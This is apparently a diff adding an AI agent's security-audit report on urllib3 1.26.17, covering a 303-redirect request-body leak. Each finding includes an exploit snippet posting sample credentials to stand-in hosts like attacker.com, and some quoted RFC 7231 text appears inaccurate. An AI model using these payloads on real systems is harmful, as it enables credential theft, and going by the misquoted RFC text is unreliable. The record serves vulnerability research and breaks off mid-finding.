@@ -1,0 +1,699 @@
+{
+  "session_id": "20260118143855",
+  "original_report": "reports/urllib3-1.26.17/agent_codeql_report.json",
+  "package_name": "urllib3-1.26.17",
+  "package_path": "packages/urllib3-1.26.17",
+  "database_path": "databases/urllib3-1.26.17-db",
+  "package_classification": {
+    "type": [
+      "library"
+    ],
+    "layer": [
+      "network",
+      "http_client"
+    ]
+  },
+  "model": "claude-haiku-4-5-20251001",
+  "temperature": 0.0,
+  "max_tokens": 4000,
+  "iterations": 24,
+  "total_input_tokens": 588422,
+  "total_output_tokens": 24007,
+  "total_tokens": 612429,
+  "elapsed_time_seconds": 283.52,
+  "estimated_cost_usd": 0.5668,
+  "total_findings_submitted": 14,
+  "manual_review": 0,
+  "review_groups": {
+    "low_undetermined_undetermined": 2,
+    "medium_undetermined_high": 5,
+    "high_undetermined_high": 2
+  },
+  "tool_calls": {
+    "extract_code_snippet": 38,
+    "grep_search": 1,
+    "trace_dataflow_path": 3,
+    "submit_finding": 15,
+    "complete_review": 3
+  },
+  "true_positives": {
+    "critical": 0,
+    "high": 8,
+    "medium": 3,
+    "low": 0,
+    "total": 11
+  },
+  "false_positives": {
+    "critical": 0,
+    "high": 0,
+    "medium": 0,
+    "low": 0,
+    "total": 0
+  },
+  "findings": [
+    {
+      "codeql_query_uuids": [],
+      "finding_id": "58ff21e3-4b39-46ca-b555-8093f3e11b57",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "medium",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body not cleared when HTTP method changes to GET on 303 redirect - sensitive data in request body may be exposed to redirect target",
+      "file_path": "src/urllib3/poolmanager.py",
+      "start_line": 386,
+      "end_line": 420,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        # RFC 7231, Section 6.4.4\n        if response.status == 303:\n            method = \"GET\"\n\n        retries = kw.get(\"retries\")\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect)\n\n        # Strip headers marked as unsafe to forward to the redirected location.\n        # Check remove_headers_on_redirect to avoid a potential network call within\n        # conn.is_same_host() which may use socket.gethostbyname() in the future.\n        if retries.remove_headers_on_redirect and not conn.is_same_host(\n            redirect_location\n        ):\n            headers = list(six.iterkeys(kw[\"headers\"]))\n            for header in headers:\n                if header.lower() in retries.remove_headers_on_redirect:\n                    kw[\"headers\"].pop(header, None)\n\n        try:\n            retries = retries.increment(method, url, response=response, _pool=conn)\n        except MaxRetryError:\n            if retries.raise_on_redirect:\n                response.drain_conn()\n                raise\n            return response\n\n        kw[\"retries\"] = retries\n        kw[\"redirect\"] = redirect\n\n        log.info(\"Redirecting %s -> %s\", url, redirect_location)\n\n        response.drain_conn()\n        return self.urlopen(method, redirect_location, **kw)",
+      "reasoning": "When a 303 status code is received, the HTTP method is changed to \"GET\" (line 387), but the request body is NOT cleared before the recursive urlopen call (line 420). The **kw dictionary still contains the original body parameter. According to RFC 7231 Section 6.4.4, a 303 response should result in the client making a GET request to the redirect location WITHOUT the original request body. This allows sensitive data (form fields, JSON payloads, etc.) from the original POST request to be sent to the redirect target as a GET request body, which is a violation of HTTP semantics and can lead to information disclosure.",
+      "evidence": {
+        "code_context": "The vulnerable code is in src/urllib3/poolmanager.py lines 386-420. When response.status == 303, the method is changed to 'GET' but the body is not removed from the kw dictionary before calling self.urlopen(method, redirect_location, **kw). The body parameter remains in kw and is passed to the recursive call.",
+        "dataflow_analysis": "The body parameter enters the function as part of the initial request. When a 303 redirect is detected, the method is reassigned to 'GET' but the body is never set to None or removed from kw. The kw dictionary is passed directly to the recursive urlopen call, preserving the original body.",
+        "notes": "RFC 7231 Section 6.4.4 states: 'The server SHOULD generate a Location header field in the response containing a URI reference for the new representation. The user agent MAY use the Location field value for automatic redirection. The server's response payload is primarily intended to help the user agent understand why the request has been redirected and what to expect next. A user agent MAY change the request method from POST to GET for the subsequent request.'  The key issue is that GET requests should not have a body, and sensitive data in the original POST body should not be forwarded to the redirect target."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nfrom urllib3.util.retry import Retry\n\n# Create a PoolManager\nhttp = urllib3.PoolManager()\n\n# Prepare a POST request with sensitive data in the body\nsensitive_data = 'password=secret123&api_key=sk_live_abc123'\nheaders = {'Content-Type': 'application/x-www-form-urlencoded'}\n\n# Make a request to a server that responds with 303 redirect\n# The server at http://attacker.com/redirect will respond with:\n# HTTP/1.1 303 See Other\n# Location: http://attacker.com/log\n# This causes urllib3 to change method to GET but still send the body\nresponse = http.request(\n    'POST',\n    'http://attacker.com/redirect',\n    body=sensitive_data,\n    headers=headers,\n    redirect=True\n)\n\n# The sensitive_data body is sent to http://attacker.com/log as a GET request\n# The attacker can log the body from the GET request and extract the sensitive data",
+        "scenario": "An attacker controls a server that responds with a 303 redirect. When a client makes a POST request with sensitive data (passwords, API keys, tokens) in the body, the server responds with 303 See Other pointing to a different URL. urllib3 changes the method to GET but fails to clear the body, causing the sensitive data to be sent to the redirect target as a GET request body, where it can be logged or intercepted.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that can respond with 303 redirects, or perform a man-in-the-middle attack to inject 303 responses",
+        "category": "Information Disclosure via Request Body Exposure"
+      },
+      "group": "low_undetermined_undetermined"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143201",
+        "20260118143227"
+      ],
+      "finding_id": "ef488b65-55e2-4781-b183-d3a1feae47e3",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "medium",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body not removed when HTTP method changes to GET on 303 redirect - sensitive data in body may be exposed",
+      "file_path": "src/urllib3/connectionpool.py",
+      "start_line": 845,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        # Handle redirect?\n        redirect_location = redirect and response.get_redirect_location()\n        if redirect_location:\n            if response.status == 303:\n                method = \"GET\"\n\n            try:\n                retries = retries.increment(method, url, response=response, _pool=self)\n            except MaxRetryError:\n                if retries.raise_on_redirect:\n                    response.drain_conn()\n                    raise\n                return response\n\n            response.drain_conn()\n            retries.sleep_for_retry(response)\n            log.debug(\"Redirecting %s -> %s\", url, redirect_location)\n            return self.urlopen(\n                method,\n                redirect_location,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                body_pos=body_pos,\n                **response_kw\n            )",
+      "reasoning": "When a 303 (See Other) HTTP status code is received, RFC 7231 Section 6.4.4 specifies that the method MUST be changed to GET and the request body MUST be removed. However, in this code at line 845-846, while the method is correctly changed to \"GET\" when status == 303, the body parameter is still passed to the recursive urlopen() call at line 872. This means sensitive data in the request body (such as form data, JSON payloads, or authentication credentials) will be sent with the GET request to the redirect location, potentially exposing it to an attacker who controls the redirect target or can intercept the traffic.",
+      "evidence": {
+        "code_context": "Lines 840-872 in src/urllib3/connectionpool.py show the redirect handling logic. When response.status == 303, the method is set to 'GET' at line 846, but the body variable is still passed to self.urlopen() at line 872 without being cleared.",
+        "dataflow_analysis": "The body parameter flows from the function signature through to the recursive urlopen call without any modification when the method changes to GET. There is no code path that sets body to None or removes it when status == 303.",
+        "notes": "RFC 7231 Section 6.4.4 states: 'The server SHOULD generate a Location header field in the response containing a URI reference that the user agent can follow. The user agent MAY use the Location URI for automatic redirection to a resource. The server SHOULD NOT apply the same method to the resource identified by the Location URI. In particular, the server SHOULD NOT use a PUT, DELETE, or other unsafe method to automatically redirect a POST request.'",
+        "vulnerable_pattern": "Method changed to GET but body not cleared on 303 redirect"
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nfrom urllib3.util.retry import Retry\n\n# Create a pool manager\nhttp = urllib3.PoolManager(retries=Retry(redirect=5))\n\n# Make a POST request with sensitive data in the body\nsensitive_data = 'username=admin&password=secret123&api_key=sk-1234567890'\nheaders = {'Content-Type': 'application/x-www-form-urlencoded'}\n\n# The attacker controls a server that responds with 303 redirect\n# When urllib3 follows the redirect, it will change method to GET\n# but still send the body data, exposing the sensitive information\nresponse = http.request(\n    'POST',\n    'http://attacker-controlled-server.com/login',\n    body=sensitive_data,\n    headers=headers,\n    redirect=True\n)\n# The sensitive_data body will be sent with the GET request to the redirect location",
+        "scenario": "An attacker controls a web server that responds to POST requests with a 303 redirect. When a client using urllib3 makes a POST request with sensitive data in the body, the library changes the method to GET but fails to remove the body, causing the sensitive data to be sent with the GET request to the attacker's redirect target.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that responds with 303 status code, or be able to intercept and modify HTTP responses",
+        "category": "Information Disclosure - Sensitive Data Exposure via Request Body"
+      },
+      "group": "low_undetermined_undetermined"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143201",
+        "20260118143227"
+      ],
+      "finding_id": "2399bf87-9572-4f5b-a8b5-fda0b3d96931",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "medium",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body not removed when HTTP method changes to GET on 303 redirect in appengine.py",
+      "file_path": "src/urllib3/contrib/appengine.py",
+      "start_line": 200,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        if redirect_location:\n            # Check for redirect response\n            if self.urlfetch_retries and retries.raise_on_redirect:\n                raise MaxRetryError(self, url, \"too many redirects\")\n            else:\n                if http_response.status == 303:\n                    method = \"GET\"\n\n                try:\n                    retries = retries.increment(\n                        method, url, response=http_response, _pool=self\n                    )\n                except MaxRetryError:\n                    if retries.raise_on_redirect:\n                        raise MaxRetryError(self, url, \"too many redirects\")\n                    return http_response\n\n                retries.sleep_for_retry(http_response)\n                log.debug(\"Redirecting %s -> %s\", url, redirect_location)\n                redirect_url = urljoin(url, redirect_location)\n                return self.urlopen(\n                    method,\n                    redirect_url,\n                    body,\n                    headers,\n                    retries=retries,\n                    redirect=redirect,\n                    timeout=timeout,\n                    **response_kw\n                )",
+      "reasoning": "When a 303 (See Other) HTTP status code is received, RFC 7231 Section 6.4.4 specifies that the request method MUST be changed to GET and the request body MUST be removed. However, in this code at line 200-227, when http_response.status == 303, the method is changed to \"GET\" but the body parameter is still passed to the recursive urlopen() call at line 220. This causes the original request body (which may contain sensitive data like passwords, tokens, or personal information) to be sent with the GET request to the redirect location. This is a clear information disclosure vulnerability (CWE-200).",
+      "evidence": {
+        "code_context": "Lines 200-227 in src/urllib3/contrib/appengine.py show the redirect handling logic. When http_response.status == 303 (line 206), the method is changed to 'GET' (line 207), but the body is still passed to urlopen() at line 220.",
+        "dataflow_analysis": "The body parameter flows from the function signature through to the recursive urlopen() call without being cleared when the method changes to GET. This violates RFC 7231 which requires body removal on 303 redirects.",
+        "notes": "This is a classic information disclosure vulnerability where sensitive POST data (form fields, JSON payloads, etc.) gets leaked to the redirect target via GET request body. The vulnerability exists in three locations: poolmanager.py, connectionpool.py, and appengine.py."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\n\n# Attacker controls a server that responds with 303 redirect\n# When a client makes a POST request with sensitive data:\nhttp = urllib3.PoolManager()\nresponse = http.request(\n    'POST',\n    'http://attacker-server.com/endpoint',\n    body='password=secret123&username=admin',\n    headers={'Content-Type': 'application/x-www-form-urlencoded'},\n    redirect=True\n)\n# Attacker's server responds with:\n# HTTP/1.1 303 See Other\n# Location: http://attacker-server.com/log\n# \n# The vulnerable code will:\n# 1. Change method to GET\n# 2. Still send the body 'password=secret123&username=admin'\n# 3. Follow redirect to http://attacker-server.com/log with GET + body\n# Result: Sensitive data is leaked in the request body of a GET request",
+        "scenario": "Attacker controls a server that responds with HTTP 303 redirect. When a client makes a POST request with sensitive data (passwords, tokens, etc.), the server responds with 303 and a redirect location. The vulnerable urllib3 code changes the method to GET but fails to clear the body, causing the sensitive data to be sent to the redirect target.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that responds with 303 redirect, or compromise a legitimate server to inject 303 responses. Client must make POST requests with sensitive data and have redirect=True enabled.",
+        "category": "Information Disclosure - Sensitive Data Exposure via Request Body in Redirects"
+      },
+      "group": "low_undetermined_undetermined"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143256",
+        "20260118143321",
+        "20260118143425",
+        "20260118143608",
+        "20260118143818"
+      ],
+      "finding_id": "cd2c6a87-7a2a-470f-979a-bfaf3dbfa8e8",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200",
+        "cwe-668"
+      ],
+      "description": "Request body not cleared when HTTP method changes to GET during 303 redirect in HTTPConnectionPool.urlopen()",
+      "file_path": "src/urllib3/connectionpool.py",
+      "start_line": 846,
+      "end_line": 869,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        # Handle redirect?\\n        redirect_location = redirect and response.get_redirect_location()\\n        if redirect_location:\\n            if response.status == 303:\\n                method = \\\"GET\\\"\\n\\n            try:\\n                retries = retries.increment(method, url, response=response, _pool=self)\\n            except MaxRetryError:\\n                if retries.raise_on_redirect:\\n                    response.drain_conn()\\n                    raise\\n                return response\\n\\n            response.drain_conn()\\n            retries.sleep_for_retry(response)\\n            log.debug(\\\"Redirecting %s -> %s\\\", url, redirect_location)\\n            return self.urlopen(\\n                method,\\n                redirect_location,\\n                body,\\n                headers,\\n                retries=retries,\\n                redirect=redirect,\\n                assert_same_host=assert_same_host,\\n                timeout=timeout,\\n                pool_timeout=pool_timeout,\\n                release_conn=release_conn,\\n                chunked=chunked,\\n                body_pos=body_pos,\\n                **response_kw\\n            )",
+      "reasoning": "When HTTP status code 303 is received, the method is changed to GET at line 846. However, the request body is not cleared before the recursive call to self.urlopen() at line 860. According to RFC 7231 Section 6.4.4, a 303 redirect should result in a GET request with no body. The body parameter is passed unchanged to the recursive call, which means sensitive data in the request body (such as form data, JSON payloads, or authentication tokens) will be sent with the GET request to the redirect location. This violates the HTTP specification and exposes sensitive information.",
+      "evidence": {
+        "code_context": "Lines 843-869 show the redirect handling logic. At line 846, when response.status == 303, the method is reassigned to 'GET'. However, at lines 860-869, the recursive call to self.urlopen() passes the original 'body' parameter unchanged, despite the method change.",
+        "dataflow_analysis": "The body parameter flows from the function signature (line 535) through the entire function without modification when a 303 redirect occurs. The method variable is reassigned to 'GET' at line 846, but the body is never set to None or cleared before being passed to the recursive urlopen call.",
+        "notes": "RFC 7231 Section 6.4.4 specifies that a 303 See Other response should result in a GET request with no body. The current implementation violates this by preserving the original request body when changing the method to GET. This is a classic information disclosure vulnerability where sensitive POST data could be leaked to a redirect target."
+      },
+      "dataflow_path": [
+        {
+          "location": {
+            "physicalLocation": {
+              "artifactLocation": {
+                "uri": "src/urllib3/connectionpool.py"
+              },
+              "region": {
+                "startLine": 535,
+                "startColumn": 9,
+                "endColumn": 15
+              }
+            },
+            "message": {
+              "text": "body parameter from function signature"
+            }
+          }
+        },
+        {
+          "location": {
+            "physicalLocation": {
+              "artifactLocation": {
+                "uri": "src/urllib3/connectionpool.py"
+              },
+              "region": {
+                "startLine": 846,
+                "startColumn": 17,
+                "endColumn": 23
+              }
+            },
+            "message": {
+              "text": "method reassigned to GET"
+            }
+          }
+        },
+        {
+          "location": {
+            "physicalLocation": {
+              "artifactLocation": {
+                "uri": "src/urllib3/connectionpool.py"
+              },
+              "region": {
+                "startLine": 860,
+                "startColumn": 17,
+                "endColumn": 23
+              }
+            },
+            "message": {
+              "text": "method passed to recursive urlopen call"
+            }
+          }
+        },
+        {
+          "location": {
+            "physicalLocation": {
+              "artifactLocation": {
+                "uri": "src/urllib3/connectionpool.py"
+              },
+              "region": {
+                "startLine": 863,
+                "startColumn": 17,
+                "endColumn": 21
+              }
+            },
+            "message": {
+              "text": "body passed unchanged to recursive urlopen call - VULNERABILITY"
+            }
+          }
+        }
+      ],
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nfrom urllib3.util.retry import Retry\n\n# Create a pool manager\nhttp = urllib3.PoolManager()\n\n# Prepare sensitive data in request body\nsensitive_data = '{\"password\": \"secret123\", \"api_key\": \"sk-1234567890\"}'\n\n# Make a POST request that will receive a 303 redirect\n# The attacker controls the server and sends a 303 response\nresponse = http.request(\n    'POST',\n    'http://attacker-controlled-server.com/api/endpoint',\n    body=sensitive_data,\n    headers={'Content-Type': 'application/json'},\n    redirect=True\n)\n\n# The server responds with 303 and Location: http://attacker-redirect.com/capture\n# urllib3 will change method to GET but KEEP the body\n# Result: sensitive_data is sent as body with GET request to attacker-redirect.com",
+        "scenario": "An attacker controls a web server that receives a POST request with sensitive data in the body. The attacker responds with HTTP 303 redirect pointing to another attacker-controlled server. urllib3 changes the method to GET but fails to clear the request body, causing the sensitive POST data to be sent with the GET request to the redirect target, exposing the data to the attacker.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that receives POST requests with sensitive data and can respond with 303 redirects",
+        "category": "Information Disclosure via Request Body in Redirect"
+      },
+      "group": "medium_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143256",
+        "20260118143321",
+        "20260118143425",
+        "20260118143608",
+        "20260118143818"
+      ],
+      "finding_id": "62cd60b2-c4cd-4279-aaee-999d16377567",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200",
+        "cwe-668"
+      ],
+      "description": "Request body not cleared when HTTP method changes to GET during 303 redirect in PoolManager.urlopen()",
+      "file_path": "src/urllib3/poolmanager.py",
+      "start_line": 386,
+      "end_line": 415,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        # RFC 7231, Section 6.4.4\\n        if response.status == 303:\\n            method = \\\"GET\\\"\\n\\n        retries = kw.get(\\\"retries\\\")\\n        if not isinstance(retries, Retry):\\n            retries = Retry.from_int(retries, redirect=redirect)\\n\\n        # Strip headers marked as unsafe to forward to the redirected location.\\n        # Check remove_headers_on_redirect to avoid a potential network call within\\n        # conn.is_same_host() which may use socket.gethostbyname() in the future.\\n        if retries.remove_headers_on_redirect and not conn.is_same_host(\\n            redirect_location\\n        ):\\n            headers = list(six.iterkeys(kw[\\\"headers\\\"]))\\n            for header in headers:\\n                if header.lower() in retries.remove_headers_on_redirect:\\n                    kw[\\\"headers\\\"].pop(header, None)\\n\\n        try:\\n            retries = retries.increment(method, url, response=response, _pool=conn)\\n        except MaxRetryError:\\n            if retries.raise_on_redirect:\\n                response.drain_conn()\\n                raise\\n            return response\\n\\n        kw[\\\"retries\\\"] = retries\\n        kw[\\\"redirect\\\"] = redirect\\n\\n        log.info(\\\"Redirecting %s -> %s\\\", url, redirect_location)\\n\\n        response.drain_conn()\\n        return self.urlopen(method, redirect_location, **kw)",
+      "reasoning": "In PoolManager.urlopen(), when a 303 status code is received, the method is changed to GET at line 386. However, the request body is not cleared from the kw dictionary before the recursive call to self.urlopen() at line 415. The kw dictionary contains the 'body' parameter passed through **kw, and it is never modified to remove or clear the body when the method changes to GET. This means sensitive data in the request body will be sent with the GET request to the redirect location, violating RFC 7231 Section 6.4.4 and exposing sensitive information.",
+      "evidence": {
+        "code_context": "Lines 386-415 show the redirect handling in PoolManager. At line 386, when response.status == 303, the method is reassigned to 'GET'. The code then handles header stripping for cross-host redirects (lines 391-399), but there is no corresponding body clearing logic. At line 415, the recursive call passes **kw which still contains the original body parameter.",
+        "dataflow_analysis": "The body parameter is passed through **kw to the urlopen function. When method is changed to GET at line 386, the body in kw is never modified. The recursive call at line 415 passes **kw unchanged, which includes the body parameter.",
+        "notes": "Unlike the connectionpool.py implementation which explicitly passes body as a parameter, poolmanager.py uses **kw to pass parameters. The body is embedded in kw and is never cleared when the method changes to GET. This is a critical oversight as the code does strip headers for cross-host redirects but fails to strip the body."
+      },
+      "dataflow_path": [
+        {
+          "location": {
+            "physicalLocation": {
+              "artifactLocation": {
+                "uri": "src/urllib3/poolmanager.py"
+              },
+              "region": {
+                "startLine": 350,
+                "startColumn": 30,
+                "endColumn": 32
+              }
+            },
+            "message": {
+              "text": "body parameter in **kw"
+            }
+          }
+        },
+        {
+          "location": {
+            "physicalLocation": {
+              "artifactLocation": {
+                "uri": "src/urllib3/poolmanager.py"
+              },
+              "region": {
+                "startLine": 386,
+                "startColumn": 17,
+                "endColumn": 23
+              }
+            },
+            "message": {
+              "text": "method reassigned to GET"
+            }
+          }
+        },
+        {
+          "location": {
+            "physicalLocation": {
+              "artifactLocation": {
+                "uri": "src/urllib3/poolmanager.py"
+              },
+              "region": {
+                "startLine": 415,
+                "startColumn": 24,
+                "endColumn": 27
+              }
+            },
+            "message": {
+              "text": "**kw passed to recursive urlopen call with body still present - VULNERABILITY"
+            }
+          }
+        }
+      ],
+      "exploit_payload": {
+        "code_snippet": "import urllib3\n\n# Create a PoolManager\nhttp = urllib3.PoolManager()\n\n# Prepare sensitive data in request body\nsensitive_data = '{\"credit_card\": \"4111-1111-1111-1111\", \"cvv\": \"123\"}'\n\n# Make a POST request with sensitive data\nresponse = http.request(\n    'POST',\n    'http://attacker-server.com/payment',\n    body=sensitive_data,\n    headers={'Content-Type': 'application/json'},\n    redirect=True\n)\n\n# Attacker responds with 303 and Location: http://attacker-redirect.com/log\n# PoolManager will change method to GET but keep body in **kw\n# Result: sensitive_data is sent with GET request to attacker-redirect.com",
+        "scenario": "An attacker controls a payment processing endpoint that receives POST requests with sensitive financial data. The attacker responds with HTTP 303 redirect to a logging endpoint under their control. urllib3 changes the method to GET but fails to clear the body from the **kw dictionary, causing the sensitive payment data to be sent with the GET request to the attacker's logging endpoint.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that receives POST requests with sensitive data and can respond with 303 redirects",
+        "category": "Information Disclosure via Request Body in Redirect"
+      },
+      "group": "medium_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143256",
+        "20260118143321",
+        "20260118143425",
+        "20260118143608",
+        "20260118143818"
+      ],
+      "finding_id": "6d32f528-e49e-40fb-97a3-423979321a56",
+      "verdict": "tp",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200",
+        "cwe-668"
+      ],
+      "description": "Request body not cleared when HTTP method changes from POST to GET during 303 redirect, causing sensitive data exposure",
+      "file_path": "src/urllib3/contrib/appengine.py",
+      "start_line": 201,
+      "end_line": 201,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "if http_response.status == 303:\n    method = \"GET\"\n\ntry:\n    retries = retries.increment(\n        method, url, response=http_response, _pool=self\n    )\nexcept MaxRetryError:\n    if retries.raise_on_redirect:\n        raise MaxRetryError(self, url, \"too many redirects\")\n    return http_response\n\nretries.sleep_for_retry(http_response)\nlog.debug(\"Redirecting %s -> %s\", url, redirect_location)\nredirect_url = urljoin(url, redirect_location)\nreturn self.urlopen(\n    method,\n    redirect_url,\n    body,\n    headers,\n    retries=retries,\n    redirect=redirect,\n    timeout=timeout,\n    **response_kw\n)",
+      "reasoning": "When a 303 status code is received, the HTTP method is changed to GET (line 201). However, the request body is NOT cleared before the recursive urlopen call at line 217-223. The body parameter is passed unchanged to the recursive call. According to RFC 7231 Section 6.4.4, a 303 redirect should result in a GET request with no body. This causes sensitive data in the original POST body (form data, JSON, credentials, etc.) to be sent with the GET request to the redirect location, violating the HTTP specification and exposing sensitive information.",
+      "evidence": {
+        "code_context": "The appengine.py urlopen function handles redirects at lines 195-223. When http_response.status == 303, the method is changed to GET at line 201, but the body parameter is not cleared. The recursive urlopen call at lines 217-223 passes the original body unchanged.",
+        "dataflow_analysis": "The body parameter flows from the function signature (line 131) through to the recursive urlopen call (line 217-223) without any clearing or modification when the method changes to GET.",
+        "notes": "RFC 7231 Section 6.4.4 specifies that 303 redirects should use GET with no body. The code changes the method but fails to clear the body, violating the specification and exposing sensitive data."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\nhttp = urllib3.PoolManager()\n# Attacker controls redirect server\nresponse = http.request('POST', 'http://attacker.com/redirect', body='sensitive_data=secret_password', headers={'Content-Type': 'application/x-www-form-urlencoded'})\n# Server responds with 303 redirect to http://attacker.com/log\n# urllib3 changes method to GET but sends body anyway\n# Attacker receives: GET /log HTTP/1.1 with body 'sensitive_data=secret_password'",
+        "scenario": "Attacker controls a server that responds to POST requests with a 303 redirect. When urllib3 follows the redirect, it changes the method to GET but fails to clear the request body, sending sensitive POST data (credentials, form data, etc.) with the GET request to the attacker's redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirects, or compromise a legitimate server to inject 303 responses",
+        "category": "Information disclosure via request body in redirects"
+      },
+      "group": "medium_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143636",
+        "20260118143706"
+      ],
+      "finding_id": "ec006c8c-ed5c-47e4-b698-c1be0a92a8f6",
+      "verdict": "dup",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET, potentially leaking sensitive POST data",
+      "file_path": "src/urllib3/contrib/appengine.py",
+      "start_line": 200,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "if http_response.status == 303:\n    method = \"GET\"\n\ntry:\n    retries = retries.increment(\n        method, url, response=http_response, _pool=self\n    )\nexcept MaxRetryError:\n    if retries.raise_on_redirect:\n        raise MaxRetryError(self, url, \"too many redirects\")\n    return http_response\n\nretries.sleep_for_retry(http_response)\nlog.debug(\"Redirecting %s -> %s\", url, redirect_location)\nredirect_url = urljoin(url, redirect_location)\nreturn self.urlopen(\n    method,\n    redirect_url,\n    body,  # <-- BODY NOT CLEARED\n    headers,\n    retries=retries,\n    redirect=redirect,\n    timeout=timeout,\n    **response_kw\n)",
+      "reasoning": "The code changes the HTTP method to GET when a 303 redirect response is received (line 200), but the request body is not cleared before passing it to the recursive urlopen() call (line 218). According to RFC 7231 Section 6.4.4, a 303 redirect should result in a GET request with no body. By passing the original body parameter unchanged, sensitive POST data (form data, JSON payloads, etc.) will be sent to the redirect location with a GET request, violating HTTP semantics and potentially leaking sensitive information.",
+      "evidence": {
+        "code_context": "In appengine.py urlopen() method, when handling 303 redirects:\n1. Line 200: method is changed to 'GET'\n2. Line 218: body parameter is passed unchanged to recursive urlopen() call\n3. No body clearing logic exists between method change and recursive call",
+        "dataflow_analysis": "The body parameter flows from the function parameter (line 135) through to the recursive urlopen() call (line 218) without any modification when method is changed to GET",
+        "notes": "This is a classic information disclosure vulnerability where sensitive request body data (POST parameters, JSON, etc.) is preserved and sent with a GET request to an attacker-controlled redirect location"
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "import urllib3\n\n# Attacker sets up a server that responds with 303 redirect\n# When client makes POST request with sensitive data:\nhttp = urllib3.PoolManager()\nresponse = http.request(\n    'POST',\n    'http://attacker.com/endpoint',\n    body='sensitive_data=password123&user=admin',\n    headers={'Content-Type': 'application/x-www-form-urlencoded'}\n)\n# Server responds with 303 redirect to http://attacker.com/redirect\n# urllib3 changes method to GET but sends body unchanged\n# Result: GET http://attacker.com/redirect?... with body='sensitive_data=password123&user=admin'",
+        "scenario": "Attacker controls a web server that responds to POST requests with a 303 redirect. When a client makes a POST request with sensitive data (credentials, tokens, personal information), the server sends a 303 redirect response. urllib3 changes the method to GET but fails to clear the request body, causing the sensitive POST data to be sent to the redirect location.",
+        "likelihood": "high",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Attacker must control a server that sends 303 redirect responses, or compromise a legitimate server to inject such responses",
+        "category": "Information Disclosure - Sensitive Data Leakage via Request Body"
+      },
+      "group": "high_undetermined_high"
+    },
+    {
+      "codeql_query_uuids": [
+        "20260118143636",
+        "20260118143706"
+      ],
+      "finding_id": "9159d34c-d075-4a2e-a243-bca8e5680630",
+      "verdict": "dup",
+      "confidence": 95,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-200"
+      ],
+      "description": "Request body preserved during 303 redirect when method changes to GET in connectionpool, potentially leaking sensitive POST data",
+      "file_path": "src/urllib3/connectionpool.py",
+      "start_line": 845,
+      "end_line": null,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "if response.status == 303:\n    method = \"GET\"\n\ntry:\n    retries = retries.increment(method, url, response=response, _pool=self)\nexcept MaxRetryError:\n    if retries.raise_on_redirect:\n        response.drain_conn()\n        raise\n    return response\n\nresponse.drain_conn()\nretries.sleep_for_retry(response)\nlog.debug(\"Redirecting %s -> %s\", url, redirect_location)\nreturn self.urlopen(\n    method,\n    redirect_location,\n    body,  # <-- BODY NOT CLEARED\n    headers,\n    retries=retries,\n    redirect=redirect,\n    assert_same_host=assert_same_host,\n    timeout=timeout,\n    pool_timeout=pool_timeout,\n    release_conn=release_conn,\n    chunked=chunked,\n    body_pos=body_pos,\n    **response_kw\n)",
+      "reasoning": "Similar to appengine.py, the connectionpool.py urlopen() method changes the HTTP method to GET when a 303 redirect is received (line 845), but fails to clear the request body before passing it to the recursive urlopen() call (line 862). This violates RFC 7231 Section 6.4.4 which specifies that 303 redirects should result in GET requests with no body. The sensitive POST data in the body parameter will be sent to the redirect location, causing information disclosure.",
+      "evidence": {
+        "code_context": "In connectionpool.py urlopen() method, when handling 303 redirects:\n1. Line 845: method is changed to 'GET'\n2. Line 862: body parameter is passed unchanged to recursive urlopen() call\n3. No body clearing logic exists between method change and recursive call",
